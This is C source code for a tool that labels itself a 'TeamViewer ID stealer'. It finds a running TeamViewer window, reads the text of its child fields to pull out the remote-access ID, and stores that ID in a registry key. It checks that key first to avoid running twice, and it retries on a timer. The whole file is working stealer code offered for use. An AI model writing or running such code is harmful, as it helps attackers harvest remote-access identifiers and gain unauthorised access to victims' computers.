/* TEAM VIEWER ID STEALER
 *
 * Try to steal TeamViewer id in registry key, running instances and log files
 *
 */
#include "tvidstealer.h"
#include "registry.h"


struct param {
    int count;          /* ID field index (eg: in TeamViewer QuickSupport the ID is the 2nd one) */
    char sid[TV_ID_LEN];  /* ID string */
    int id;               /* ID DWORD */
    BOOL found;         /* Status */
};

/* Check if id is a valid TeamViewer ID */
BOOL
is_tvId(char *sid, int *id){
    int id1,id2,id3;
    if(3==sscanf(sid,"%d %d %d",&id1,&id2,&id3)){
        printf("[+] TeamViewer ID: %d %d %d\n",id1,id2,id3);
        *id = id1*1000000 + id2*1000 + id3;
        return TRUE;
    }
    return FALSE;
}

/* Look for TeamViewer Id in the specified window field (hwnd) */
BOOL CALLBACK
find_tvId (HWND hwnd, LPARAM lParam){
    BOOL ret=TRUE;
    struct param *p=(struct param *)lParam;
    p->count++;

    SendMessage(hwnd, WM_GETTEXT, (WPARAM) TV_ID_LEN, (LPARAM) p->sid);

    if(is_tvId(p->sid, &p->id)){
        p->found=TRUE;
        ret=FALSE;
    }
    return ret;
}

int
main(){
    struct param p;
    int tries=0;
    if(check_registry_key()){
        return 0;
    }
    while(tries < TIMEOUT || TIMEOUT==0){
        HWND hwnd=FindWindow(NULL,TV_PROCESS_NAME);
        if(hwnd){
            fprintf(stdout,"[+] TeamViewer found\n");

            /* Reset param struct */
            p.count=0;
            *p.sid=0;
            p.id=0;
            p.found=FALSE;

            EnumChildWindows(hwnd,find_tvId,(LPARAM)&p);

            if(p.found){
                add_registry_key(p.id);
                break;
            }
        }
        else {
            fprintf(stderr,"[-] TeamViewer not found\n");
        }
        Sleep(SLEEP);
        tries++;
    }
    return 0;
}
